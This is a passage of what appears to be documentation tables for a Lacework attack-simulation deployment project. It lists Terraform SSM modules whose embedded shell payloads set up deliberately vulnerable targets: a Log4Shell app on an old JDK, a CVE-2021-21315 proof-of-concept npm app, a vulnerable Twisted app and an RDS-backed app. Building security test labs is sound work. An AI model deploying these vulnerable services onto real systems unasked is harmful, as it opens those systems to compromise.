                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| target-vulnerable-log4j-app                                                | ./modules/ssm/deploy-log4j-app                                 | ssm_deploy_log4j_app                       | context.aws.ssm.vulnerable.log4j_app                                      | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "log4j_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8080<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-log4j-app                                 | <pre>locals \{<br/>    app\_dir = &quot;/vuln\-log4j\-app&quot;<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    screen \-S vuln\_log4j\_app\_target \-X quit<br/>    screen \-wipe<br/>    truncate \-s 0 /tmp/vuln\_log4j\_app\_target\.log<br/>    <br/>    rm \-rf $\{local\.app\_dir\}<br/>    mkdir $\{local\.app\_dir\}<br/>    cd $\{local\.app\_dir\}<br/><br/>    log &quot;creating local files\.\.\.&quot;<br/>    echo $\{base64gzip\(local\.web\)\} \| base64 \-d \| gunzip &gt; web\.py<br/>    echo $\{base64gzip\(local\.ldap\)\} \| base64 \-d \| gunzip  &gt; ldap\.py<br/>    echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| gunzip &gt; requirements\.txt<br/><br/>    \# install java 8u131<br/>    log &quot;checking for jdk1\.8\.0\_131\.\.\.&quot;<br/>    if \[ \! \-d /usr/java/jdk1\.8\.0\_131/ \]; then<br/>        log &quot;jdk1\.8\.0\_131 not found \- installing\.\.\.&quot;<br/>        wget \-c \-\-header &quot;Cookie: oraclelicense=accept\-securebackup\-cookie&quot; http://download\.oracle\.com/otn\-pub/java/jdk/8u131\-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk\-8u131\-linux\-x64\.tar\.gz<br/>        mkdir \-p /usr/java<br/>        sudo tar \-xvzf jdk\-8u131\-linux\-x64\.tar\.gz \-C /usr/java<br/>    else<br/>        log &quot;jdk1\.8\.0\_131 found \- skipping install&quot;<br/>    fi<br/>    <br/><br/>    \# update java path<br/>    log &quot;setting up java environment for build\.\.\.&quot;<br/>    export JAVA\_HOME=/usr/java/jdk1\.8\.0\_131/<br/>    sudo update\-alternatives \-\-install /usr/bin/java java $$\{JAVA\_HOME%\*/\}/bin/java 20000<br/>    sudo update\-alternatives \-\-install /usr/bin/javac javac $$\{JAVA\_HOME%\*/\}/bin/javac 20000<br/>    <br/>    java \-version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    \# download gradle 7\.3\.1<br/>    log &quot;checking for gradle 7\.3\.1\.\.\.&quot;<br/>    if \[ \! \-d /opt/gradle/gradle\-7\.3\.1 \]; then<br/>        log &quot;gradle not found \- installing\.\.\.&quot;<br/>        wget https://services\.gradle\.org/distributions/gradle\-7\.3\.1\-bin\.zip<br/>        mkdir /opt/gradle<br/>        unzip \-d /opt/gradle gradle\-7\.3\.1\-bin\.zip<br/>    else<br/>        log &quot;gradle 7\.3\.1 found \- skipping install&quot; <br/>    fi<br/><br/>    \# update gradle path<br/>    log &quot;updating environment PATH to include gradle\.\.\.&quot;<br/>    export PATH=$PATH:/opt/gradle/gradle\-7\.3\.1/bin<br/>    gradle \-\-version &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    \# clone the log4shell vulnerable app<br/>    log &quot;cloning https://github\.com/christophetd/log4shell\-vulnerable\-app\.\.\.&quot;<br/>    git clone https://github\.com/christophetd/log4shell\-vulnerable\-app<br/>    cd log4shell\-vulnerable\-app<br/>    log &quot;running gradle build\.\.\.&quot;<br/>    nohup gradle bootJar \-\-no\-daemon &amp;<br/>    GRADLE\_PID=$\!<br/>    while kill \-0 $GRADLE\_PID 2&gt; /dev/null; do<br/>        log &quot;Process is still running\.\.\.&quot;<br/>        sleep 30<br/>    done<br/>    log &quot;gradle build complete\.&quot;<br/>    <br/>    ls \-ltr build/libs/\*\.jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    \# copy java jar<br/>    log &quot;Copying java jar\.\.&quot;<br/>    cp build/libs/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar $\{local\.app\_dir\}/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    <br/>    \# change to app root dir<br/>    cd $\{local\.app\_dir\}<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        if pgrep \-f &quot;log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar&quot;; then<br/>            kill \-9 $\(pgrep \-f &quot;log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar&quot;\)<br/>        fi<br/>        screen \-S vuln\_log4j\_app\_target \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile /tmp/vuln\_log4j\_app\_target\.log \-S vuln\_log4j\_app\_target \-m java \-jar $\{local\.app\_dir\}/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar \-\-server\.port=$\{var\.inputs\[&quot;listen\_port&quot;\]\}<br/>        screen \-S vuln\_log4j\_app\_target \-X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url\.\.\.&quot;<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl unzip git&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl unzip git&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    web = file\(<br/>                            &quot;$\{path\.module\}/resources/web\.py&quot;,<br/>                        \)<br/><br/>    ldap = file\(<br/>                            &quot;$\{path\.module\}/resources/ldap\.py&quot;,<br/>                        \)<br/>    requirements = file\(<br/>                            &quot;$\{path\.module\}/resources/requirements\.txt&quot;,<br/>                        \)<br/>    <br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| target-vulnerable-npm-app                                                  | ./modules/ssm/deploy-npm-app                                   | ssm_deploy_npm_app                         | context.aws.ssm.vulnerable.npm_app                                        | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "npm_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8089<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-npm-app                                   | <pre>locals \{<br/>    repo = &quot;https://github\.com/ForbiddenProgrammer/CVE\-2021\-21315\-PoC&quot;<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    screen \-S vuln\_npm\_app\_target \-X quit<br/>    truncate \-s 0 /tmp/vuln\_npm\_app\_target\.log<br/>    log &quot;checking for git\.\.\.&quot;<br/>    while \! command \-v git; do<br/>        log &quot;git not found \- waiting&quot;<br/>        sleep 10<br/>    done<br/>    log &quot;git: $\(command \-v  git\)&quot;<br/>    rm \-rf /vuln\_npm\_app\_target &amp;&amp; \\<br/>    mkdir /vuln\_npm\_app\_target &amp;&amp; \\<br/>    cd /vuln\_npm\_app\_target &amp;&amp; \\<br/>    git clone $\{local\.repo\} &amp;&amp; \\<br/>    cd CVE\-2021\-21315\-PoC &amp;&amp; \\<br/>    echo $\{base64gzip\(local\.index\_js\_base64\)\} \| base64 \-d \| gunzip &gt; index\.js<br/>    npm install &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        screen \-S vuln\_npm\_app\_target \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile /tmp/vuln\_npm\_app\_target\.log \-S vuln\_npm\_app\_target \-m npm start \-\-prefix /vuln\_npm\_app\_target/CVE\-2021\-21315\-PoC<br/>        screen \-S vuln\_npm\_app\_target \-X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url\.\.\.&quot;<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl nodejs npm&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl nodejs npm&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    index\_js\_base64 = templatefile\(<br/>                &quot;$\{path\.module\}/resources/index\.js&quot;,<br/>                \{<br/>                    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>                \}\)<br/>    <br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| target-vulnerable-python3-twisted-app                                      | ./modules/ssm/deploy-python3-twisted-app                       | ssm_deploy_python3_twisted_app             | context.aws.ssm.vulnerable.python3_twisted_app                            | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "python3_twisted_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8090<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-python3-twisted-app                       | <pre>locals \{<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    screen \-S vuln\_python3\_twisted\_app\_target \-X quit<br/>    screen \-wipe<br/>    truncate \-s 0 /tmp/vuln\_python3\_twisted\_app\_target\.log<br/>    if command \-v $PACKAGE\_MANAGER &amp;&amp; $PACKAGE\_MANAGER list \| grep &quot;python3\-twisted&quot; \| grep &quot;18\.9\.0\-11ubuntu0\.20\.04&quot;; then<br/>        mkdir \-p /vuln\_python3\_twisted\_app<br/>        cd /vuln\_python3\_twisted\_app<br/>        echo $\{base64gzip\(local\.app\_py\)\} \| base64 \-d \| gunzip &gt; app\.py<br/>        echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| gunzip &gt; requirements\.txt<br/>        log &quot;installing requirements\.\.\.&quot;<br/>        python3 \-m pip install \-r requirements\.txt &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;requirements installed&quot;<br/>        <br/>        START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>        while true; do<br/>            log &quot;starting app&quot;<br/>            screen \-S vuln\_python3\_twisted\_app\_target \-X quit<br/>            screen \-wipe<br/>            screen \-d \-L \-Logfile /tmp/vuln\_python3\_twisted\_app\_target\.log \-S vuln\_python3\_twisted\_app\_target \-m python3 /vuln\_python3\_twisted\_app/app\.py<br/>            screen \-S vuln\_python3\_twisted\_app\_target \-X colon &quot;logfile flush 0^M&quot;<br/>            sleep 30<br/>            log &quot;check app url\.\.\.&quot;<br/>            while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>                log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>                sleep 60<br/>            done<br/>            log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>            sleep 1800<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break<br/>            else<br/>                log &quot;restarting loop\.\.\.&quot;<br/>            fi<br/>        done<br/>    else<br/>        log &quot;python twisted vulnerability required the following package installed:&quot;<br/>        log &quot;python3\-twisted/focal\-updates,focal\-security,now 18\.9\.0\-11ubuntu0\.20\.04\.1&quot;<br/>    fi<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl python3\-pip&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl python3\-pip&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    app\_py = templatefile\(<br/>                &quot;$\{path\.module\}/resources/app\.py&quot;,<br/>                \{<br/>                    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>                \}\)<br/>    requirements = templatefile\(<br/>                &quot;$\{path\.module\}/resources/requirements\.txt&quot;,<br/>                \{<br/>                \}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| target-vulnerable-rds-app                                                  | ./modules/ssm/deploy-rds-app                                   | ssm_deploy_rds_app                         | context.aws.ssm.vulnerable.rds_app                                        | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "rds_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8091<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-rds-app                                   | <pre>locals \{<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    app\_dirname = &quot;vuln\_rdsapp\_target&quot;<br/>    app\_path = &quot;/$\{local\.app\_dirname\}/app\.py&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    screen \-S vuln\_rdsapp\_target \-X quit<br/>    screen \-wipe<br/>    truncate \-s 0 /tmp/vuln\_rdsapp\_target\.log<br/>    log &quot;removing previous app directory&quot;<br/>    rm \-rf /$\{local\.app\_dirname\}<br/>    log &quot;building app directory&quot;<br/>    mkdir \-p /$\{local\.app\_dirname\}/templates<br/>    cd /$\{local\.app\_dirname\}<br/>    <br/>    echo $\{base64gzip\(local\.app\)\} \| base64 \-d \| gunzip &gt; app\.py<br/>    echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| gunzip &gt; requirements\.txt<br/>    echo $\{base64gzip\(local\.test\)\} \| base64 \-d \| gunzip &gt; test\.py<br/>    curl \-LOJ https://s3\.amazonaws\.com/rds\-downloads/rds\-combined\-ca\-bundle\.pem<br/>    echo $\{base64gzip\(local\.database\)\} \| base64 \-d \| gunzip &gt; bootstrap\.sql<br/>    echo $\{base64gzip\(local\.entrypoint\)\} \| base64 \-d \| gunzip &gt; entrypoint\.sh<br/>    echo $\{base64gzip\(local\.index\)\} \| base64 \-d \| gunzip &gt; templates/index\.html<br/>    echo $\{base64gzip\(local\.cast\)\} \| base64 \-d \| gunzip &gt; templates/cast\.html<br/><br/>    log &quot;updating entrypoing permissions&quot;<br/>    chmod 755 entrypoint\.sh<br/><br/>    log &quot;installing requirements\.\.\.&quot;<br/>    python3 \-m pip install \-r requirements\.txt &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    log &quot;requirements installed&quot;<br/>    <br/>    log &quot;running mysql boostrap\.\.\.&quot;<br/>    mysql \-\-ssl\-ca=rds\-combined\-ca\-bundle\.pem \-\-ssl\-mode=REQUIRED \-h $\{split\(&quot;:&quot;, var\.inputs\[&quot;db\_host&quot;\]\)\[0\]\} \-u$\{var\.inputs\[&quot;db\_user&quot;\]\} \-p$\{var\.inputs\[&quot;db\_password&quot;\]\} &lt; bootstrap\.sql<br/>    log &quot;mysql boostrap complete&quot;<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        screen \-S $\{local\.app\_dirname\} \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile /tmp/$\{local\.app\_dirname\}\.log \-S $\{local\.app\_dirname\} \-m /$\{local\.app\_dirname\}/entrypoint\.sh<br/>        screen \-S $\{local\.app\_dirname\} \-X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url\.\.\.&quot;<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\}/cast \| tee \-a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\}/cast \- retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl python3\-pip mysql\-client\-core\-8\.0&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl python3\-pip mysql\-shell&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    app = templatefile\(<br/>                            &quot;$\{path\.module\}/resources/app\.py\.tpl&quot;,<br/>                            \{<br/>                                region = var\.inputs\[&quot;db\_region&quot;\]<br/>                            \}<br/>                        \)<br/>    test = templatefile\(<br/>                          &quot;$\{path\.module\}/resources/test\.py\.tpl&quot;,<br/>                            \{<br/>                                region = var\.inputs\[&quot;db\_region&quot;\]<br/>                            \}<br/>                        \)<br/>    requirements = templatefile\(<br/>                          &quot;$\{path\.module\}/resources/requirements\.txt&quot;,<br/>                          \{\}<br/>                        \)<br/>    database = templatefile\(<br/>                          &quot;$\{path\.module\}/resources/bootstrap\.sql\.tpl&quot;,<br/>                            \{<br/>                                db\_user = var\.inputs\[&quot;db\_user&quot;\]<br/>                                db\_name = var\.inputs\[&quot;db\_name&quot;\]<br/>                            \}<br/>                        \)<br/>    entrypoint = templatefile\(<br/>                            &quot;$\{path\.module\}/resources/entrypoint\.sh\.tpl&quot;,<br/>                            \{<br/>                                 listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>                                 app\_path = local\.app\_path<br/>                            \}<br/>                        \)<br/>    index = file\(<br/>                            &quot;$\{path\.module\}/resources/index\.html&quot;<br/>                        \)<br/>    cast = file\(<br/>                            &quot;$\{path\.module\}/resources/cast\.html&quot;<br/>                        \)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
